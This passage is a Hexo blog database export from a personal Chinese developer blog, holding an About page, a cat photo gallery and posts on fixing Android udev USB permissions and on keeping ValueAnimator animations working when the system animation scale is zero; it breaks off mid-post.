IO大会之旅/2021-05-25-00-11-36-image.png","hash":"461164af30f7884df9d373d2f09f7371049b4ae2","modified":1711606685184},{"_id":"public/2021/06/16/我的2021 Google IO大会之旅/2021-05-24-13-53-24-image.png","hash":"ba4b76dee827ffc6737bddfce7209bd0b2271bf7","modified":1711606685184},{"_id":"public/2021/06/16/我的2021 Google IO大会之旅/2021-05-24-13-46-41-image.png","hash":"ecccde6f6dfc42766d1d13cbaa3c2b162d3e25de","modified":1711606685184}],"Category":[],"Data":[{"_id":"widget","data":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}],"Page":[{"title":"About","date":"2023-07-14T15:41:56.000Z","type":"about","_content":"\n> 倾听，感受，思考\n\n#### 站名由来\n\n养了一只猪里猪气的小猫，建站之初没想到什么好的博客名字，于是乎就叫猪猫（Pig Cat）吧。\n\n![Pig Cat](https://blog.ysy950803.top/img/avatar-ysy.png)\n\n[-> 快来吸猫呀！](https://blog.ysy950803.top/gallery/)\n\n#### 简单几句\n\n做一些微小的工作，分享一些**人生经验**。技术出身，随缘撰写。\n\n人固有一死，或轻于鸿毛。鸿毛之轻，千万年前不可测量，但现代却可以。\n\n如果我的文字能为你提供帮助，你可以关闭广告拦截插件（或开启无痕模式），点一点广告，也算是一种支持（为尽量满足浏览体验，我已去掉吸顶和悬浮广告）。\n\n#### 个人博客\n\n- [Personal](https://ysy950803.top)\n- [CSDN](https://blog.csdn.net/ysy950803)\n- [Juejin](https://juejin.im/user/587348ff8d6d8100589967ab/posts)\n- [GitHub](https://github.com/ysy950803)\n- [SSPai](https://sspai.com/u/ysy950803)\n\n---\n\n> Listening, feeling, and thinking\n\n#### The origin of my blog name\n\nHaving a piggy kitten, I just don't have a good idea for the blog name, so call it 'Pig Cat' simply.\n\n[-> Catch cat!](https://blog.ysy950803.top/gallery/)\n\n#### A few words\n\nDo tiny jobs and share some **life lessons**. Write by heart as a developer.\n\nMan is mortal, being lighter than a feather its lightness could not be measured thousands of years ago, but can be measured in modern times.\n\nIf my articles are helpful to you, you can turn off the ad blocking plug-in (or turn on incognito mode) and tap some advertisements, which is also a kind of support for me.\n\n#### Other personal blogs\n\n- [Personal](https://ysy950803.top)\n- [CSDN](https://blog.csdn.net/ysy950803)\n- [Juejin](https://juejin.im/user/587348ff8d6d8100589967ab/posts)\n- [GitHub](https://github.com/ysy950803)\n- [SSPai](https://sspai.com/u/ysy950803)\n","source":"about/index.md","raw":"---\ntitle: About\ndate: 2023-07-14 23:41:56\ntype: \"about\"\n---\n\n> 倾听，感受，思考\n\n#### 站名由来\n\n养了一只猪里猪气的小猫，建站之初没想到什么好的博客名字，于是乎就叫猪猫（Pig Cat）吧。\n\n![Pig Cat](https://blog.ysy950803.top/img/avatar-ysy.png)\n\n[-> 快来吸猫呀！](https://blog.ysy950803.top/gallery/)\n\n#### 简单几句\n\n做一些微小的工作，分享一些**人生经验**。技术出身，随缘撰写。\n\n人固有一死，或轻于鸿毛。鸿毛之轻，千万年前不可测量，但现代却可以。\n\n如果我的文字能为你提供帮助，你可以关闭广告拦截插件（或开启无痕模式），点一点广告，也算是一种支持（为尽量满足浏览体验，我已去掉吸顶和悬浮广告）。\n\n#### 个人博客\n\n- [Personal](https://ysy950803.top)\n- [CSDN](https://blog.csdn.net/ysy950803)\n- [Juejin](https://juejin.im/user/587348ff8d6d8100589967ab/posts)\n- [GitHub](https://github.com/ysy950803)\n- [SSPai](https://sspai.com/u/ysy950803)\n\n---\n\n> Listening, feeling, and thinking\n\n#### The origin of my blog name\n\nHaving a piggy kitten, I just don't have a good idea for the blog name, so call it 'Pig Cat' simply.\n\n[-> Catch cat!](https://blog.ysy950803.top/gallery/)\n\n#### A few words\n\nDo tiny jobs and share some **life lessons**. Write by heart as a developer.\n\nMan is mortal, being lighter than a feather its lightness could not be measured thousands of years ago, but can be measured in modern times.\n\nIf my articles are helpful to you, you can turn off the ad blocking plug-in (or turn on incognito mode) and tap some advertisements, which is also a kind of support for me.\n\n#### Other personal blogs\n\n- [Personal](https://ysy950803.top)\n- [CSDN](https://blog.csdn.net/ysy950803)\n- [Juejin](https://juejin.im/user/587348ff8d6d8100589967ab/posts)\n- [GitHub](https://github.com/ysy950803)\n- [SSPai](https://sspai.com/u/ysy950803)\n","updated":"2024-03-25T07:31:26.048Z","path":"about/index.html","comments":1,"layout":"page","_id":"cluaufh000000the6biv323fu","content":"<blockquote>\n<p>倾听，感受，思考</p>\n</blockquote>\n<h4 id=\"站名由来\"><a href=\"#站名由来\" class=\"headerlink\" title=\"站名由来\"></a>站名由来</h4><p>养了一只猪里猪气的小猫，建站之初没想到什么好的博客名字，于是乎就叫猪猫（Pig Cat）吧。</p>\n<p><img src=\"https://blog.ysy950803.top/img/avatar-ysy.png\" alt=\"Pig Cat\"></p>\n<p><a href=\"https://blog.ysy950803.top/gallery/\">-&gt; 快来吸猫呀！</a></p>\n<h4 id=\"简单几句\"><a href=\"#简单几句\" class=\"headerlink\" title=\"简单几句\"></a>简单几句</h4><p>做一些微小的工作，分享一些<strong>人生经验</strong>。技术出身，随缘撰写。</p>\n<p>人固有一死，或轻于鸿毛。鸿毛之轻，千万年前不可测量，但现代却可以。</p>\n<p>如果我的文字能为你提供帮助，你可以关闭广告拦截插件（或开启无痕模式），点一点广告，也算是一种支持（为尽量满足浏览体验，我已去掉吸顶和悬浮广告）。</p>\n<h4 id=\"个人博客\"><a href=\"#个人博客\" class=\"headerlink\" title=\"个人博客\"></a>个人博客</h4><ul>\n<li><a href=\"https://ysy950803.top/\">Personal</a></li>\n<li><a href=\"https://blog.csdn.net/ysy950803\">CSDN</a></li>\n<li><a href=\"https://juejin.im/user/587348ff8d6d8100589967ab/posts\">Juejin</a></li>\n<li><a href=\"https://github.com/ysy950803\">GitHub</a></li>\n<li><a href=\"https://sspai.com/u/ysy950803\">SSPai</a></li>\n</ul>\n<hr>\n<blockquote>\n<p>Listening, feeling, and thinking</p>\n</blockquote>\n<h4 id=\"The-origin-of-my-blog-name\"><a href=\"#The-origin-of-my-blog-name\" class=\"headerlink\" title=\"The origin of my blog name\"></a>The origin of my blog name</h4><p>Having a piggy kitten, I just don’t have a good idea for the blog name, so call it ‘Pig Cat’ simply.</p>\n<p><a href=\"https://blog.ysy950803.top/gallery/\">-&gt; Catch cat!</a></p>\n<h4 id=\"A-few-words\"><a href=\"#A-few-words\" class=\"headerlink\" title=\"A few words\"></a>A few words</h4><p>Do tiny jobs and share some <strong>life lessons</strong>. Write by heart as a developer.</p>\n<p>Man is mortal, being lighter than a feather its lightness could not be measured thousands of years ago, but can be measured in modern times.</p>\n<p>If my articles are helpful to you, you can turn off the ad blocking plug-in (or turn on incognito mode) and tap some advertisements, which is also a kind of support for me.</p>\n<h4 id=\"Other-personal-blogs\"><a href=\"#Other-personal-blogs\" class=\"headerlink\" title=\"Other personal blogs\"></a>Other personal blogs</h4><ul>\n<li><a href=\"https://ysy950803.top/\">Personal</a></li>\n<li><a href=\"https://blog.csdn.net/ysy950803\">CSDN</a></li>\n<li><a href=\"https://juejin.im/user/587348ff8d6d8100589967ab/posts\">Juejin</a></li>\n<li><a href=\"https://github.com/ysy950803\">GitHub</a></li>\n<li><a href=\"https://sspai.com/u/ysy950803\">SSPai</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>倾听，感受，思考</p>\n</blockquote>\n<h4 id=\"站名由来\"><a href=\"#站名由来\" class=\"headerlink\" title=\"站名由来\"></a>站名由来</h4><p>养了一只猪里猪气的小猫，建站之初没想到什么好的博客名字，于是乎就叫猪猫（Pig Cat）吧。</p>\n<p><img src=\"https://blog.ysy950803.top/img/avatar-ysy.png\" alt=\"Pig Cat\"></p>\n<p><a href=\"https://blog.ysy950803.top/gallery/\">-&gt; 快来吸猫呀！</a></p>\n<h4 id=\"简单几句\"><a href=\"#简单几句\" class=\"headerlink\" title=\"简单几句\"></a>简单几句</h4><p>做一些微小的工作，分享一些<strong>人生经验</strong>。技术出身，随缘撰写。</p>\n<p>人固有一死，或轻于鸿毛。鸿毛之轻，千万年前不可测量，但现代却可以。</p>\n<p>如果我的文字能为你提供帮助，你可以关闭广告拦截插件（或开启无痕模式），点一点广告，也算是一种支持（为尽量满足浏览体验，我已去掉吸顶和悬浮广告）。</p>\n<h4 id=\"个人博客\"><a href=\"#个人博客\" class=\"headerlink\" title=\"个人博客\"></a>个人博客</h4><ul>\n<li><a href=\"https://ysy950803.top/\">Personal</a></li>\n<li><a href=\"https://blog.csdn.net/ysy950803\">CSDN</a></li>\n<li><a href=\"https://juejin.im/user/587348ff8d6d8100589967ab/posts\">Juejin</a></li>\n<li><a href=\"https://github.com/ysy950803\">GitHub</a></li>\n<li><a href=\"https://sspai.com/u/ysy950803\">SSPai</a></li>\n</ul>\n<hr>\n<blockquote>\n<p>Listening, feeling, and thinking</p>\n</blockquote>\n<h4 id=\"The-origin-of-my-blog-name\"><a href=\"#The-origin-of-my-blog-name\" class=\"headerlink\" title=\"The origin of my blog name\"></a>The origin of my blog name</h4><p>Having a piggy kitten, I just don’t have a good idea for the blog name, so call it ‘Pig Cat’ simply.</p>\n<p><a href=\"https://blog.ysy950803.top/gallery/\">-&gt; Catch cat!</a></p>\n<h4 id=\"A-few-words\"><a href=\"#A-few-words\" class=\"headerlink\" title=\"A few words\"></a>A few words</h4><p>Do tiny jobs and share some <strong>life lessons</strong>. Write by heart as a developer.</p>\n<p>Man is mortal, being lighter than a feather its lightness could not be measured thousands of years ago, but can be measured in modern times.</p>\n<p>If my articles are helpful to you, you can turn off the ad blocking plug-in (or turn on incognito mode) and tap some advertisements, which is also a kind of support for me.</p>\n<h4 id=\"Other-personal-blogs\"><a href=\"#Other-personal-blogs\" class=\"headerlink\" title=\"Other personal blogs\"></a>Other personal blogs</h4><ul>\n<li><a href=\"https://ysy950803.top/\">Personal</a></li>\n<li><a href=\"https://blog.csdn.net/ysy950803\">CSDN</a></li>\n<li><a href=\"https://juejin.im/user/587348ff8d6d8100589967ab/posts\">Juejin</a></li>\n<li><a href=\"https://github.com/ysy950803\">GitHub</a></li>\n<li><a href=\"https://sspai.com/u/ysy950803\">SSPai</a></li>\n</ul>\n"},{"title":"Gallery","date":"2023-07-16T04:32:56.000Z","type":"gallery","_content":"\n{% gallery %}\n![](https://blog.ysy950803.top/img/gallery/cat/2001689482086_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2011689482086_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2021689482205_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2031689482262_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2041689482287_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2051689482317_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2071689482421_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2081689482452_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2091689482531_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2101689482608_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2061689482403_.pic.jpg)\n{% endgallery %}\n","source":"gallery/index.md","raw":"---\ntitle: Gallery\ndate: 2023-07-16 12:32:56\ntype: \"gallery\"\n---\n\n{% gallery %}\n![](https://blog.ysy950803.top/img/gallery/cat/2001689482086_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2011689482086_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2021689482205_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2031689482262_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2041689482287_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2051689482317_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2071689482421_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2081689482452_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2091689482531_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2101689482608_.pic.jpg)\n![](https://blog.ysy950803.top/img/gallery/cat/2061689482403_.pic.jpg)\n{% endgallery %}\n","updated":"2024-03-25T07:31:26.049Z","path":"gallery/index.html","comments":1,"layout":"page","_id":"cluaufh060002the61gpoe97g","content":"<div class=\"gallery\">\n    <div class=\"fj-gallery  data\" data-rowHeight=\"220\" data-limit=\"10\">\n    <span class=\"gallery-data\">[{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2001689482086_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2011689482086_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2021689482205_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2031689482262_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2041689482287_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2051689482317_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2071689482421_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2081689482452_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2091689482531_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2101689482608_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2061689482403_.pic.jpg\",\"alt\":\"\"}]</span>\n    </div>\n    <button class=\"gallery-load-more\"><span>加载更多</span><i class=\"fa-solid fa-arrow-down\"></i></button>\n    </div>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<div class=\"gallery\">\n    <div class=\"fj-gallery  data\" data-rowHeight=\"220\" data-limit=\"10\">\n    <span class=\"gallery-data\">[{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2001689482086_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2011689482086_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2021689482205_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2031689482262_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2041689482287_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2051689482317_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2071689482421_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2081689482452_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2091689482531_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2101689482608_.pic.jpg\",\"alt\":\"\"},{\"url\":\"https://blog.ysy950803.top/img/gallery/cat/2061689482403_.pic.jpg\",\"alt\":\"\"}]</span>\n    </div>\n    <button class=\"gallery-load-more\"><span>加载更多</span><i class=\"fa-solid fa-arrow-down\"></i></button>\n    </div>\n"},{"title":"Tags","date":"2023-07-14T15:37:19.000Z","type":"tags","orderby":"random","order":1,"_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\ndate: 2023-07-14 23:37:19\ntype: \"tags\"\norderby: random\norder: 1\n---\n","updated":"2024-03-25T07:31:26.078Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cluaufh090005the6g66e0lkj","content":"","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":""}],"Post":[{"layout":"post","title":"USB调试Android设备时遇到no permissions (verify udev rules)的解决办法","subtitle":"开阔视野。","date":"2018-03-02T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n最近在Ubuntu上调试一些Android O系统的手机，出现adb root失败的情况，明明手机已经root了。\n具体就是在执行adb devices查看连接的设备时，设备后显示 **no permissions (verify udev rules)** 字样。\n根据官网的提示，去查文档：https://developer.android.com/studio/run/device.html#setting-up\n可以看到下面的解决办法：\n![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMzAzMTMzNjAxNTk4?x-oss-process=image/format,png)\n\n------\n\n也就是说，我们需要在 **/etc/udev/rules.d/** 下面创建一个 **51-android.rules** 文件，\n我比较习惯用gedit，所以直接 **sudo gedit /etc/udev/rules.d/51-android.rules** \n如果是高通芯片的手机，直接在文件中输入：\n\n```\nSUBSYSTEM==\"usb\", ATTR{idVendor}==\"05c6\", MODE=\"0666\", GROUP=\"plugdev\"\n```\n\n并保存即可，再次adb root时，如果还失败，记得在手机上选择连接方式为传输文件，而不是只充电。\n\n------\n\n**提示：** 如果是别的机型，可能那个idVendor参数不一样，高通对应是05c6，具体可以查看谷歌的文档：\n[https://developer.android.com/studio/run/device.html#VendorIds](https://developer.android.com/studio/run/device.html#VendorIds)\n另外，要查看自己USB所连接的机型信息，可以用lsusb命令看。若出现Qualcomm，肯定就是高通了。\n","source":"_posts/2018-03-03-USB调试Android设备时遇到no permissions (verify udev rules)的解决办法.md","raw":"---\nlayout:     post\ntitle:      USB调试Android设备时遇到no permissions (verify udev rules)的解决办法\nsubtitle:   开阔视野。\ndate:       2018-03-03\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Android\n---\n\n最近在Ubuntu上调试一些Android O系统的手机，出现adb root失败的情况，明明手机已经root了。\n具体就是在执行adb devices查看连接的设备时，设备后显示 **no permissions (verify udev rules)** 字样。\n根据官网的提示，去查文档：https://developer.android.com/studio/run/device.html#setting-up\n可以看到下面的解决办法：\n![这里写图片描述](https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMzAzMTMzNjAxNTk4?x-oss-process=image/format,png)\n\n------\n\n也就是说，我们需要在 **/etc/udev/rules.d/** 下面创建一个 **51-android.rules** 文件，\n我比较习惯用gedit，所以直接 **sudo gedit /etc/udev/rules.d/51-android.rules** \n如果是高通芯片的手机，直接在文件中输入：\n\n```\nSUBSYSTEM==\"usb\", ATTR{idVendor}==\"05c6\", MODE=\"0666\", GROUP=\"plugdev\"\n```\n\n并保存即可，再次adb root时，如果还失败，记得在手机上选择连接方式为传输文件，而不是只充电。\n\n------\n\n**提示：** 如果是别的机型，可能那个idVendor参数不一样，高通对应是05c6，具体可以查看谷歌的文档：\n[https://developer.android.com/studio/run/device.html#VendorIds](https://developer.android.com/studio/run/device.html#VendorIds)\n另外，要查看自己USB所连接的机型信息，可以用lsusb命令看。若出现Qualcomm，肯定就是高通了。\n","slug":"USB调试Android设备时遇到no permissions (verify udev rules)的解决办法","published":1,"updated":"2024-03-25T07:31:25.850Z","comments":1,"photos":[],"link":"","_id":"cluaufh030001the64hs5chrt","content":"<p>最近在Ubuntu上调试一些Android O系统的手机，出现adb root失败的情况，明明手机已经root了。<br>具体就是在执行adb devices查看连接的设备时，设备后显示 <strong>no permissions (verify udev rules)</strong> 字样。<br>根据官网的提示，去查文档：<a href=\"https://developer.android.com/studio/run/device.html#setting-up\">https://developer.android.com/studio/run/device.html#setting-up</a><br>可以看到下面的解决办法：<br><img src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMzAzMTMzNjAxNTk4?x-oss-process=image/format,png\" alt=\"这里写图片描述\"></p>\n<hr>\n<p>也就是说，我们需要在 <strong>&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;</strong> 下面创建一个 <strong>51-android.rules</strong> 文件，<br>我比较习惯用gedit，所以直接 <strong>sudo gedit &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;51-android.rules</strong><br>如果是高通芯片的手机，直接在文件中输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SUBSYSTEM==&quot;usb&quot;, ATTR&#123;idVendor&#125;==&quot;05c6&quot;, MODE=&quot;0666&quot;, GROUP=&quot;plugdev&quot;</span><br></pre></td></tr></table></figure>\n\n<p>并保存即可，再次adb root时，如果还失败，记得在手机上选择连接方式为传输文件，而不是只充电。</p>\n<hr>\n<p><strong>提示：</strong> 如果是别的机型，可能那个idVendor参数不一样，高通对应是05c6，具体可以查看谷歌的文档：<br><a href=\"https://developer.android.com/studio/run/device.html#VendorIds\">https://developer.android.com/studio/run/device.html#VendorIds</a><br>另外，要查看自己USB所连接的机型信息，可以用lsusb命令看。若出现Qualcomm，肯定就是高通了。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>最近在Ubuntu上调试一些Android O系统的手机，出现adb root失败的情况，明明手机已经root了。<br>具体就是在执行adb devices查看连接的设备时，设备后显示 <strong>no permissions (verify udev rules)</strong> 字样。<br>根据官网的提示，去查文档：<a href=\"https://developer.android.com/studio/run/device.html#setting-up\">https://developer.android.com/studio/run/device.html#setting-up</a><br>可以看到下面的解决办法：<br><img src=\"https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTgwMzAzMTMzNjAxNTk4?x-oss-process=image/format,png\" alt=\"这里写图片描述\"></p>\n<hr>\n<p>也就是说，我们需要在 <strong>&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;</strong> 下面创建一个 <strong>51-android.rules</strong> 文件，<br>我比较习惯用gedit，所以直接 <strong>sudo gedit &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;51-android.rules</strong><br>如果是高通芯片的手机，直接在文件中输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SUBSYSTEM==&quot;usb&quot;, ATTR&#123;idVendor&#125;==&quot;05c6&quot;, MODE=&quot;0666&quot;, GROUP=&quot;plugdev&quot;</span><br></pre></td></tr></table></figure>\n\n<p>并保存即可，再次adb root时，如果还失败，记得在手机上选择连接方式为传输文件，而不是只充电。</p>\n<hr>\n<p><strong>提示：</strong> 如果是别的机型，可能那个idVendor参数不一样，高通对应是05c6，具体可以查看谷歌的文档：<br><a href=\"https://developer.android.com/studio/run/device.html#VendorIds\">https://developer.android.com/studio/run/device.html#VendorIds</a><br>另外，要查看自己USB所连接的机型信息，可以用lsusb命令看。若出现Qualcomm，肯定就是高通了。</p>\n"},{"layout":"post","title":"如何防止开发者选项关闭动画后使其失效","subtitle":"知其所以然。","date":"2018-08-02T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n很多用户为了手机用起来感觉上快，在开发者选项里把系统动画给关了，即把那3个缩放比例改成了0，系统默认一般是1x。个人建议调到0.5x就很合适了，没必要关闭，否则某些动效比较多的App体验会很差。\n本文的问题就是，当开发者选项中的动画缩放比例被全部调成0后，App中部分设置了duration的属性动画就会失效，表现为直接从开头跳到了结尾，没有动画过程。\n\n我们先分析下为什么会这样。\n看ValueAnimator（/frameworks/base/core/java/android/animation/ValueAnimator.java）的部分源码：\n\n```java\npublic final boolean doAnimationFrame(long frameTime) {\n    ......\n \n    if (mLastFrameTime < 0) {\n        if (mSeekFraction >= 0) {\n            long seekTime = (long) (getScaledDuration() * mSeekFraction); // 开发者选项改后此处为0\n            mStartTime = frameTime - seekTime;\n            mSeekFraction = -1;\n        }\n        mStartTimeCommitted = false;\n    }\n    mLastFrameTime = frameTime;\n     \n    final long currentTime = Math.max(frameTime, mStartTime);\n    boolean finished = animateBasedOnTime(currentTime);\n \n    if (finished) {\n        endAnimation();\n    }\n    return finished;\n}\n \nboolean animateBasedOnTime(long currentTime) {\n    boolean done = false;\n    if (mRunning) {\n        final long scaledDuration = getScaledDuration(); // 开发者选项改后此处为0\n        ......\n        if (scaledDuration == 0) {\n            // 0 duration animator, ignore the repeat count and skip to the end\n            done = true;\n        } ......\n    }\n    return done;\n}\n \n \nprivate long getScaledDuration() {\n    return (long)(mDuration * sDurationScale); // 开发者选项修改直接影响sDuration的值\n}\n```\n\n动画绘制是否结束取决于animateBasedOnTime方法，源码也注释到，如果duration为0，会忽略repeat count直接跳到结束状态。这里的sDurationScale也就是开发者选项中设置的动画缩放倍数。\n我们只要在动画初始化后，通过反射来重置一下这个静态变量即可：\n\n```java\nprivate void resetAnimatorDurationScale() {\n    try {\n        Field field = ValueAnimator.class.getDeclaredField(\"sDurationScale\");\n        field.setAccessible(true);\n        if (field.getFloat(null) == 0) {\n            field.setFloat(null, 1);\n        }\n    } catch (NoSuchFieldException | IllegalAccessException e) {\n        e.printStackTrace();\n    }\n}\n```\n\n但很显然，系统会在应用进程重启后第一次调用getWindowManagerService时重设这个值，所以必须得每次启动后都设置一次（比如在主Activity的onCreate中）。\n","source":"_posts/2018-08-03-如何防止开发者选项关闭动画后使其失效.md","raw":"---\nlayout:     post\ntitle:      如何防止开发者选项关闭动画后使其失效\nsubtitle:   知其所以然。\ndate:       2018-08-03\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n很多用户为了手机用起来感觉上快，在开发者选项里把系统动画给关了，即把那3个缩放比例改成了0，系统默认一般是1x。个人建议调到0.5x就很合适了，没必要关闭，否则某些动效比较多的App体验会很差。\n本文的问题就是，当开发者选项中的动画缩放比例被全部调成0后，App中部分设置了duration的属性动画就会失效，表现为直接从开头跳到了结尾，没有动画过程。\n\n我们先分析下为什么会这样。\n看ValueAnimator（/frameworks/base/core/java/android/animation/ValueAnimator.java）的部分源码：\n\n```java\npublic final boolean doAnimationFrame(long frameTime) {\n    ......\n \n    if (mLastFrameTime < 0) {\n        if (mSeekFraction >= 0) {\n            long seekTime = (long) (getScaledDuration() * mSeekFraction); // 开发者选项改后此处为0\n            mStartTime = frameTime - seekTime;\n            mSeekFraction = -1;\n        }\n        mStartTimeCommitted = false;\n    }\n    mLastFrameTime = frameTime;\n     \n    final long currentTime = Math.max(frameTime, mStartTime);\n    boolean finished = animateBasedOnTime(currentTime);\n \n    if (finished) {\n        endAnimation();\n    }\n    return finished;\n}\n \nboolean animateBasedOnTime(long currentTime) {\n    boolean done = false;\n    if (mRunning) {\n        final long scaledDuration = getScaledDuration(); // 开发者选项改后此处为0\n        ......\n        if (scaledDuration == 0) {\n            // 0 duration animator, ignore the repeat count and skip to the end\n            done = true;\n        } ......\n    }\n    return done;\n}\n \n \nprivate long getScaledDuration() {\n    return (long)(mDuration * sDurationScale); // 开发者选项修改直接影响sDuration的值\n}\n```\n\n动画绘制是否结束取决于animateBasedOnTime方法，源码也注释到，如果duration为0，会忽略repeat 